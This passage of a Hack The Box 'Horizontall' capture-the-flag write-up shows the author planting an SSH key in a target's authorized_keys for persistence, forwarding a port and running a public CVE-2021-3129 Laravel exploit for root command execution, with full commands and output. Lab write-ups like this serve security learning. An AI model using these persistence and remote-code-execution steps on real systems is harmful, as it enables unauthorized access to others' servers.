ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDI0hBiMrm3Dz0m76kurQfP6n0Gh6xDEtCa9tuXhv54cHWqkdZsJhzQkzOy5h+alBHJ6VTzKsF7lFt+KAH0aOBMUOeST1c4ihibA9Om5LDXwKAsalf57R3aR6h1aGynWBijXkhe0wexl7o5EujgjDfci7T2JBq5qbogm0ZLhcjvcBirQP39J4kf0LubAoUSqNOvTSzSqvkyQCN8+Yxd6M9oSrey/Ob3cQvF8WoKfu2j0HGnE8ML504rTrLw1AAHbKo6hwI6IS0NQuQ3jYzOHuDWyeFXhoImSu4fCjawx6xGlEKvqKtC20pVxDJUsxQ5YLBY5y1DUbj+dsU5RFFdzskuV6V3C6vmVbW1AuoHLDviPHox9YCELWr38aJ0QeJkqdfDxJs5LAFEroUmWMaJV8PESRHAfsqXmL3zSyswaDe2TyQEpRlwVUTqdkO5iZhU2mZem5PWg5dEzMwtuS5mPDDGWPlDV0ouEOPuMKO5OcG/TaQPpTfE6CT/H3fP5PmBieU= eMVee@kali

```
After copying the contents of the key I can place it with *echo* in the directory *~/.ssh/authorized_keys* on the target machine. The command looks something like this: **echo "text" > ~/.ssh/authorized_keys** .

```bash
strapi@horizontall:~$ mkdir ~/.ssh

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDI0hBiMrm3Dz0m76kurQfP6n0Gh6xDEtCa9tuXhv54cHWqkdZsJhzQkzOy5h+alBHJ6VTzKsF7lFt+KAH0aOBMUOeST1c4ihibA9Om5LDXwKAsalf57R3aR6h1aGynWBijXkhe0wexl7o5EujgjDfci7T2JBq5qbogm0ZLhcjvcBirQP39J4kf0LubAoUSqNOvTSzSqvkyQCN8+Yxd6M9oSrey/Ob3cQvF8WoKfu2j0HGnE8ML504rTrLw1AAHbKo6hwI6IS0NQuQ3jYzOHuDWyeFXhoImSu4fCjawx6xGlEKvqKtC20pVxDJUsxQ5YLBY5y1DUbj+dsU5RFFdzskuV6V3C6vmVbW1AuoHLDviPHox9YCELWr38aJ0QeJkqdfDxJs5LAFEroUmWMaJV8PESRHAfsqXmL3zSyswaDe2TyQEpRlwVUTqdkO5iZhU2mZem5PWg5dEzMwtuS5mPDDGWPlDV0ouEOPuMKO5OcG/TaQPpTfE6CT/H3fP5PmBieU= eMVee@kali" > ~/.ssh/authorized_keys

```

To setup local port forwarding with SSH the command should look like this:
**ssh -i [key] -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER**


The options used are as follows:
* -i is used for an identity file
* -L is used for the address
    * [LOCAL_IP:]LOCAL_PORT - The local machine IP address and port number. When LOCAL_IP is omitted, the ssh client binds on the localhost.
    * DESTINATION:DESTINATION_PORT - The IP or hostname and the port of the destination machine.
* [USER@]SERVER_IP - The remote SSH user and server IP address.

In this case, the command I use to setup local port forwarding looks like: **ssh -i key -L 8000:127.0.0.1:8000 strapi@horizontall.htb**.

```bash
┌──(eMVee@kali)-[~/Documents/horizontall]
└─$ ssh -i key -L 8000:127.0.0.1:8000 strapi@horizontall.htb
The authenticity of host 'horizontall.htb (10.129.239.35)' can't be established.
ECDSA key fingerprint is SHA256:rlqcbRwBVk92jqxFV79Tws7plMRzIgEWDMc862X9ViQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'horizontall.htb' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 15 10:21:42 UTC 2021

  System load:  0.0               Processes:           176
  Usage of /:   84.7% of 4.85GB   Users logged in:     0
  Memory usage: 43%               IP address for eth0: 10.129.239.35
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15


```

Once I see the login is successful, I open the browser and navigate to http://127.0.0.1:8000 to see if it worked.

![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-16.png){: width="700" height="400" }

When I open the web page I do indeed get the confirmation that Laravel is being used, as was seen with curl.

It looks like some sort of standard website and I don't see any interesting hyperlinks or other interesting functionalities. I decide to do a google search for "Exploit laravel" and I come across a link to [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web/laravel). In one of the screenshots I see a URL going to a profiles folder. I check whether it is also present on the Horizontall machine.

![Image](/assets/img/WriteUp/HTB/Horizontall/HTB-Horizontal-17.png){: width="700" height="400" }

## Privilege escalation
Since the profiles folder is present on Horizontall, I continue reading the article at [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web/laravel) and see a vulnerability named CVE-2021-3129.

I decide to do a Google search for "CVE-2021-3129 exploit Github" and soon came across an exploit that is at [Github](https://github.com/nth347/CVE-2021-3129_exploit). I clone the repository to my Horizontall folder.

```bash
┌──(eMVee@kali)-[~/Documents/horizontall]
└─$ git clone https://github.com/nth347/CVE-2021-3129_exploit.git
Cloning into 'CVE-2021-3129_exploit'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 3 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (1/1), done.
                                                                                                                    
┌──(eMVee@kali)-[~/Documents/horizontall]
└─$ cd CVE-2021-3129_exploit 
                                                                                                                    
┌──(eMVee@kali)-[~/Documents/horizontall/CVE-2021-3129_exploit]
└─$ ls
exploit.py  README.md

```

First I want to see how I can use the exploit. This is neatly described in the README.md I saw on Github. Just to be sure, I'd like to take another look at the instructions. 

```bash
┌──(eMVee@kali)-[~/Documents/horizontall/CVE-2021-3129_exploit]
└─$ cat README.md
# CVE-2021-3129_exploit
Exploit for CVE-2021-3129
## Lab setup:
```
$ git clone https://github.com/laravel/laravel.git
$ cd laravel
$ git checkout e849812
$ composer install
$ composer require facade/ignition==2.5.1
$ php artisan serve
```
## Usage:
```
$ git clone https://github.com/nth347/CVE-2021-3129_exploit.git
$ cd CVE-2021-3129_exploit
$ chmod +x exploit.py
$ ./exploit.py http://localhost:8000 Monolog/RCE1 id
```
## Example:
```
nth347@nth347:~$ ./exploit.py http://localhost:8000 Monolog/RCE1 "uname -a"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

Linux nth347 5.7.0-kali1-amd64 #1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64 GNU/Linux

[i] Trying to clear logs
[+] Logs cleared
```
## Reference:
* [Ambionics disclosure](https://www.ambionics.io/blog/laravel-debug-rce)
* [CVE-2021-3129](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3129)
```

The example clearly shows how a remote command execution can be performed.
For convenience I choose to view the flag of the root directly via the command: **cat /root/root.txt** 

```bash
┌──(eMVee@kali)-[~/Documents/horizontall/CVE-2021-3129_exploit]
└─$ ./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Cloning into 'phpggc'...
remote: Enumerating objects: 2673, done.
remote: Counting objects: 100% (1015/1015), done.
remote: Compressing objects: 100% (576/576), done.
remote: Total 2673 (delta 414), reused 883 (delta 308), pack-reused 1658
Receiving objects: 100% (2673/2673), 400.37 KiB | 1.10 MiB/s, done.
Resolving deltas: 100% (1056/1056), done.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

---- ROOT FLAG ----

[i] Trying to clear logs
[+] Logs cleared
              
```

The root flag has been captured and with that I decide to shut down the machine. 